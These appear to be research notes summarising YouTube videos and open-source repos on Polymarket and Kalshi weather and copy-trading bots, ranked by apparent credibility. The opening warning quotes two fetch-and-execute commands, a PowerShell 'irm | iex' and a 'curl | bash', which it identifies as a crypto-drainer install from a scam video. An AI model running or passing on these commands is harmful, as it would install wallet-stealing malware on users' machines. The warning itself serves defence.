# YouTube — EXTRACTED INTELLIGENCE (RAW)

Captured: 2026-06-12 from metadata harvest of 26 videos (raw dump in youtube_metadata.md).
Transcripts were 429-blocked, but descriptions + chapters + linked repos carry the substance.

---

## 🚨 SCAM / MALWARE WARNING — do NOT run
- **4JC0ZAv6qhQ** "I Made $15,000 Betting on WEATHER" (channel "polymarket") tells you to run:
  `powershell irm web05driver.com | iex`  and  `curl -fsSL driversmain.com/install-driver.sh | bash`.
  **This is a crypto-drainer malware install command.** Classic fake-"indicator"/fake-bot scam.
  NEVER paste these. Flagging because it surfaces under "polymarket weather bot" searches.
- General pattern: many of these videos are **affiliate/referral shills** (esp. ItsRagnar,
  Kevin Callens) — descriptions stuffed with Telegram-bot referral links + copy-pasted Solana
  SEO spam. Treat tool recommendations as paid placements, not endorsements.

---

## ⭐ BEST WEATHER BOT BLUEPRINT — github.com/natestokens/polymarket-weather-bot
"Built with Claude Code" (video hej22I5Sit4, Nates Tokens). Most detailed + HONEST results.
- **Ensemble: 173-member composite** — ECMWF IFS, ECMWF AIFS, NCEP GEFS, ICON — via Open-Meteo.
- **City bias correction** vs historical ASOS airport data: NYC +1.4°F warm (29-day LaGuardia),
  Miami −2.2°F cool, Chicago +1.4°F.
- **Edge = model_probability − market_price.** Thresholds: **5pp for NO signals, 15pp for YES.**
  (Asymmetric: easier to fade an overpriced YES than to back one.)
- **"Stay away from the middle"**: 3°F buffer around ensemble mean → avoid high-variance bets.
- Conviction-based sizing; $1–2 min stakes OK for data collection.
- **Pure Python, NO dependencies** (builtins only). Files: bot.py, verify.py, signals.csv.
- Run: `python3 bot.py` | `python3 bot.py 2026-05-25 CHI` | `python3 verify.py --summary`.
- **HONEST verified result (May 27 2026): +$77 P&L, 60.9% win rate, +27.6% ROI on $279 staked.**
  → Realistic, modest, believable — unlike the "$80k/month" hype videos.

This + the alteregoeth repo (weather_tools_repos.md) are the two best starting points.

## Other weather tools (from videos)
- **Moon Dev** (UN4c_UwDKcM "Claude Code Broke Polymarket Weather", ZpwnSn_TFio "opus 4.5 bot
  1,266% in 4 min", 46k views) — builds algo bots live; funnels to paid livestream (moondev.com).
  Heavy on philosophy ("remove emotion"), light on free specifics. Claude-Code-centric.
- **ravn.gg** (Emil Nielsen) — weather edge-finder tool, waitlist. Video has real chapters:
  forecast sources → finding edges → 2 strategies.
- **StormBot.Ai** — commercial: GFS/ECMWF/NWS ensemble vs market, Kelly sizing, 24/7, no-code.
  Names traders **gopfan2 and meropi** as six/seven-figure weather earners. (meropi = NEW name.)
- **TasanLab** (tasanlab.com) — "structured weather framework," runs public $100 challenge,
  sells private coaching.

## 📚 BEST EDUCATIONAL CONTENT (watch these, skip the shills)
- **Cameron Predicts — "FULL POLYMARKET COURSE 2026" (BoJX4DfZs7s, 76 min).** The curriculum IS
  the chapter list — a genuine framework:
  Price/Probability/EV → Why Most Traders Lose → **EDGE** → Quantitative vs Qualitative markets
  → **Execution Edge** → **Arbitrage** → Copytrading → Bots/Automation → Risk Mgmt →
  **Polymarket vs Kalshi**. (Free; funnels to Whop discord + Kalshi referral.)
- **Nate B Jones — "$313 → $438,000 in 30 days" (BiqG3it0gY0, 117k views, 29 min).** Framework
  video (not a how-to). Bot had **98% win rate**; **92.4% of wallets on the platform lose money.**
  Dev claims he **rebuilt the whole system with Claude in ~40 min.** Taxonomy of inefficiency
  "gaps": **speed gaps, reasoning gaps, fragmentation gaps, discipline gaps** (+ a 5th). Thesis:
  AI collapses arbitrage windows fast; durable edge = structural gaps AI can't close quarterly.
  Full prompts behind a paywalled substack.
- **7O93LhW8Gsc — "Top 5 Polymarket Trading Terminals 2026":** Predictefy, TradeFox, Stand,
  Fireplace, Chance. (Good map of the terminal landscape.)

---

## 🧰 COPY-TRADING TOOLS LANDSCAPE (from videos — many are referral shills, vet hard)
| Tool | Type | Notes |
|---|---|---|
| **TradeFox** (thetradefox.com) | Copy terminal | No-KYC, proportional/fixed modes, AI filters, tournaments. Most-pushed. |
| **PolyCop** (t.me/PolyCop_BOT) | Copy bot | "Fastest"; won ItsRagnar's speed test; 10% less fees. |
| **Polycule** (polycule.trade) | Copy bot | ⚠️ "had a HACK, less trustworthy" per ItsRagnar. |
| **PolyGun** (PolyGunSniperBot) | Copy/sniper | Copy "insiders". |
| **Kage** (kage.fun) | AI copy bot | Speed-focused; has gitbook docs. |
| **Kreo** (kreo.app) | Copy/wallet finder | Find smart/insider wallets. |
| **PolyBot/TradePolyBot, PolyScout, Polycool** | Telegram bots | Referral-driven; unvetted. |
| Terminals: **Predictefy, Stand, Fireplace, Chance** | Terminals | Stand = the COPYCAT/Poly Syncer engine. |

## Wallet-analysis sites (for vetting who to copy)
- **predictfolio.com/leaderboard** , **predicting.top** , **polymarketanalytics.com**
  (shown by ItsRagnar as his wallet-research stack). Add to the analytics list in copytrading_wallets.md.

## NEW named entities to chase
- **meropi** — weather six/seven-figure earner (alongside gopfan2). Pull wallet + stats.
- The "$313→$438k, 98% win" bot — likely a crypto/short-window bot, not weather (verify).

---

# HARVEST #2 (WIDE) — 60+ more videos. Raw in youtube_metadata_2.md. Highlights:

## ⭐⭐ CLAUDE CODE BUILD BLUEPRINTS (your core interest — build your own, don't buy shills)
- **"The Prediction Engineer" — Vibe Code a Polymarket Bot with Claude Code** (oRV-NpYEtuA,
  38k views). FULL stack revealed in chapters: **Flask + SQLite + HTML real-time Polymarket
  whale tracker**, built by prompting Claude Code ("Cloud Code") in the terminal. Flow:
  init project → "God Prompt" → generate DB + web server → trade-fetcher script → find whale
  traders (e.g. "Venezuela Insider") → install deps → launch local web UI. = a concrete,
  no-code-experience path to a working tracker. THIS is the template to copy.
- **Same channel — Polymarket Sniper Bot in 10 min** (LKRVUSa_OYQ). Claude Code + **Opus 4.5**,
  **only 283 lines**. News-driven sniping: fast buys when breaking news hits (tariff ruling,
  Fed chair nominee). Optimized for speed by removing order confirms. Distrusts the web UI for
  speed. → a news/event latency play (different from weather; faster, riskier).
- **Moon Dev** — 4+ Claude Code Polymarket bot videos (ZZTeNLZUvBw 29k, OUGKFow7euc 23k,
  F6Qj1v1C0lw 19k, UN4c_UwDKcM weather). Strong on philosophy (remove emotion, systematize),
  but every desc funnels to a PAID livestream (moondev.com/t/...) — little free specifics.
- **Mr.Profit — "$1025/day AI Polymarket Bot (Claude Code)"** (KOTGnXqmsZI) → pushes
  **polybuild.app** (a no-code Polymarket bot builder) + paid Skool.
- META-PATTERN: **Claude Code is THE way people build these bots now.** Kavee already has Claude
  Code → he can build the tracker/bot himself instead of paying for any of the sold bots.

## ⭐⭐ THE REAL BUILDER'S TOOLKIT (official + open, not shills)
- **github.com/Polymarket/polymarket-cli** (OFFICIAL, Rust). Browse markets, order books, price
  history (no wallet); place/cancel limit+market orders, positions, balances, leaderboards,
  bridge, conditional-token split/merge/redeem (wallet). **`-o json` mode = built for agents/
  scripts** → pipe to jq, drive from Claude Code. This is the clean foundation for any bot.
- **github.com/jon-becker/prediction-market-analysis**. "Largest public dataset" of Polymarket
  + Kalshi (**36GB**, Parquet, on-chain trade history). `make setup` / `make index` / `make
  analyze`. → **backtest a strategy on real history before risking money.** Research-grade.
- **github.com/natestokens/polymarket-weather-bot** — best weather bot (see above).
- **github.com/Polymarket/py-clob-client** (OFFICIAL Python CLOB client) — the library to place
  orders programmatically. Pairs with Claude Code for a Python bot (vs the Rust CLI).
- **RobotTraders — ~100-line open-source PYTHON COPY BOT** (video P9XS7wl_UUA, 10k views):
  github.com/RobotTraders/bits_and_bobs/blob/main/polymarket_copy_bot.py — scrapes leaderboard,
  auto-copies a trader's latest bets, **dry-run mode** to test safely first. Beginner-friendly.
  Channel also has: Polymarket API setup/auth tutorial + "automate on a free AWS VPS" guide.
  → THE concrete free copy-trading build (vs the paid shill bots). Best starting point for copy.
- **Kushak — polymarket-auto-trade-example** (video ZbFTmDgSe_4): step-by-step programmatic
  trading — create wallet, fund with **USDC.e** (NOT plain USDC — had issues), set allowances,
  create CLOB API keys, find condition_id (Gamma API / dev tools), send trade, check result.
  github.com/Kushak1/polymarket-auto-trade-example. The technical plumbing how-to.

## ⭐ NOWCAST + THE "ADVECTION" EDGE (novel, specific) — nowcast.trade
- Kalshi temperature dashboard (videos by "Aipublishing Pro"; -DDH6na2bwY full tour).
- KEY INSIGHT quoted: *"The cleanest edge on Kalshi temperature markets isn't signals, whale
  tracking, or fancy forecast models. It's **advection**."* (= horizontal transport of warm/
  cold air masses.) The play = **NOWCASTING**: use real-time **METAR** airport observations to
  see an air mass arriving faster/slower than the day-ahead forecast assumed, and trade the
  temp bucket before the market reprices. Claims 62% overnight ROI on a temp market.
- Pages: /methodology, /morning-edge-v2, Lock Signals, METAR data, SMS alerts (paid SaaS, JS
  app — couldn't scrape full method, but the advection/nowcasting concept is the takeaway and
  it's reproducible with free METAR via api.weather.gov).
- NOTE: this complements the day-ahead ensemble edge — advection is the INTRADAY refinement.

## ⭐ EDUCATION (no-shill)
- **Captain Altcoin — "Kalshi... the Only Strategy That Actually Makes Money"** (1PFPWzD92H0,
  13k views): "complete tactical framework for CFTC-regulated markets, no hype, no picks, no
  secret Discord." Worth watching for the framework.
- Plus Cameron Predicts 76-min course (Harvest #1) remains the best structured curriculum.

## MORE TOOLS SEEN (vet hard, many referral)
- polybuild.app (no-code bot builder), Kage (kage.fun — 0.8% flat fee, same-block copy exec,
  30+ params, you pick wallets), plus the Harvest-#1 copy-bot table (TradeFox/PolyCop/etc).

## TAKEAWAYS
- The HONEST signal across everything: real weather edge ≈ modest (~25% ROI, ~60% win at small
  scale), NOT the "$80k/month" thumbnails. natestokens' verified log is the credible benchmark.
- Claude Code is a recurring theme (natestokens, Moon Dev, Nate B Jones, ItsRagnar's Skool) —
  building your own small bot is the legit path; the sold bots are mostly affiliate funnels.
- Cameron Predicts (76-min course) + natestokens repo = best free learning combo.
